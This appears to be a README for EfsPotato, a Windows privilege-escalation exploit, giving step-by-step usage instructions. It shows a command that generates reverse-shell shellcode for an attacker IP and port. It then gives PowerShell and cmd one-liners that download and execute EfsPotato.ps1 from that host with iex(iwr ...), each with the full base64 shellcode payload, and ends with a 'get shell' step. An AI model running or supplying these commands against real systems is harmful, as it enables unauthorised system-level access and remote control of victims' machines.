# EfsPotato

## Reference

https://github.com/0neAtSec/EfsPotato-1

https://github.com/zcgonvh/EfsPotato

https://github.com/senzee1984/micr0_shell

## Run

1. Generate shellcode

`python genshellcode.py --ip 192.168.100.152 --port 20000 --language base64`

![image](https://github.com/user-attachments/assets/3a867049-8b4e-41f5-a35d-86ed3c1e4543)

2. Run at target

For powershell:

```
iex(iwr 192.168.100.152:8000/EfsPotato.ps1 -UseBasicParsing); EfsPotato SDHSZUiLQmBIi3AYSIt2MEyLDk2LCU2LSRDrY0GLSTxNMf9Bt4hNAc9JAc9Fiz9NAc9Bi08YRYt3IE0BzuM//8lIMfZBizSOTAHOSDHASDHS/KyEwHQHwcoNAcLr9EQ5wnXaRYtXJE0BykEPtwxKRYtfHE0By0GLBItMAcjDw0yJzUG4jk4O7OiP////SYnESDHAZrhsbFBIuFdTMl8zMi5kUEiJ4UiD7CBMieD/0EiDxCBJicZJicFBuMvt/DtMicvoVf///0gxyWa5mAFIKcxIjRQkZrkCAkiD7DD/0EiDxDBJidlBuNkJ9a3oK////0iD7DBIMcmxAkgx0rIBTTHAQbAGTTHJTIlMJCBMiUwkKP/QSYnESIPEMEmJ2UG4DLots+jz/v//SIPsIEyJ4Ugx0rICSIkUJEgx0ma6TiBIiVQkArrAqGSYSIlUJARIjRQkTTHAQbAWTTHJSIPsOEyJTCQgTIlMJChMiUwkMP/QSIPEOEmJ6UG4cv6zFuiZ/v//SLqckpvRmoea/0j30lJIieJBVEFUQVRIMclmUVFRsf9m/8FmUUgxyWZRZlFRUVFRUVGxaFFIiedIieFIg+kgUVdIMclRUVFI/8FR/slRUVFRSYnISYnJ/9A=
```

For cmd:

```
powershell -c "iex(iwr 192.168.100.152:8000/EfsPotato.ps1 -UseBasicParsing); EfsPotato SDHSZUiLQmBIi3AYSIt2MEyLDk2LCU2LSRDrY0GLSTxNMf9Bt4hNAc9JAc9Fiz9NAc9Bi08YRYt3IE0BzuM//8lIMfZBizSOTAHOSDHASDHS/KyEwHQHwcoNAcLr9EQ5wnXaRYtXJE0BykEPtwxKRYtfHE0By0GLBItMAcjDw0yJzUG4jk4O7OiP////SYnESDHAZrhsbFBIuFdTMl8zMi5kUEiJ4UiD7CBMieD/0EiDxCBJicZJicFBuMvt/DtMicvoVf///0gxyWa5mAFIKcxIjRQkZrkCAkiD7DD/0EiDxDBJidlBuNkJ9a3oK////0iD7DBIMcmxAkgx0rIBTTHAQbAGTTHJTIlMJCBMiUwkKP/QSYnESIPEMEmJ2UG4DLots+jz/v//SIPsIEyJ4Ugx0rICSIkUJEgx0ma6TiBIiVQkArrAqGSYSIlUJARIjRQkTTHAQbAWTTHJSIPsOEyJTCQgTIlMJChMiUwkMP/QSIPEOEmJ6UG4cv6zFuiZ/v//SLqckpvRmoea/0j30lJIieJBVEFUQVRIMclmUVFRsf9m/8FmUUgxyWZRZlFRUVFRUVGxaFFIiedIieFIg+kgUVdIMclRUVFI/8FR/slRUVFRSYnISYnJ/9A="
```

3. Get shell

![螢幕擷取畫面 2025-04-01 074940](https://github.com/user-attachments/assets/72798cc9-e0e4-4279-a116-16e6958bffe1)

